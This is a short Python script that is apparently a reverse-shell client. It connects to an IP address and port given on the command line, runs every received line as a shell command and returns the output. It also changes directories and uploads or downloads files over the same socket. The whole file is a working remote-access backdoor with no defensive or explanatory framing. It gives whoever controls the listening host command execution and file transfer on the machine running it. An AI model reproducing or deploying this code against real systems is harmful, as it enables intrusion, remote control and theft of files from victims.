import socket
import argparse
import subprocess
import os
import time





def run_shell_cmd(cmd):
    """ Run shell command """
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
    cmd_output = process.communicate()[0]
    return cmd_output


def change_dir(path):
    """ change directory if path found otherwise return error to user """
    try:
        os.chdir(path.strip())
    except FileNotFoundError as err:
        return str(err).encode()


def handle_data(client_socket):
    """ Handle user data """
    while True:    
        data = client_socket.recv(1024).decode()
        if data.strip() == "exit" or not data:
            break
        if len(data.split(" ")) == 2 and data.split(" ")[0] in ("download", "upload"):
            handle_file(client_socket, data)
            continue

        if "cd " in data[:3]:
            cmd_output = change_dir(data[3:])
        else:
            cmd_output = run_shell_cmd(data)

        if not cmd_output:
            cmd_output = b" "
        client_socket.send(cmd_output)
    client_socket.close()



def handle_file(client_socket, data):
    command, file = data.split(" ")
    if command == "upload":
        upload_file(file, client_socket)
    elif command == "download":
        download_file(file, client_socket)



def upload_file(dst_file, client_socket):
    with open(dst_file, 'wb') as fd:
        while True:
            source_data = client_socket.recv(1024)
            if source_data == b":DONE:":
                break
            elif source_data == b":ABORT:":
                os.remove(dst_file)
                break
            fd.write(source_data)
        


def download_file(src_file, client_socket):
    try:    
        with open(src_file, 'rb') as fd:
            while True:
                content = fd.read(1024)
                if not content:
                    time.sleep(1)
                    client_socket.send(b":DONE:")
                    break
                client_socket.send(content)
    except Exception as err:
        client_socket.send(f":ABORT: {err}".encode())
        


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('--ip', type=str, required=True)
    parser.add_argument('--port', type=int, required=True)
    args = parser.parse_args()
    return args



def main():
    args = get_args()
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((args.ip, args.port))
    handle_data(client_socket)
    
    
        
if __name__ == "__main__":
    main()
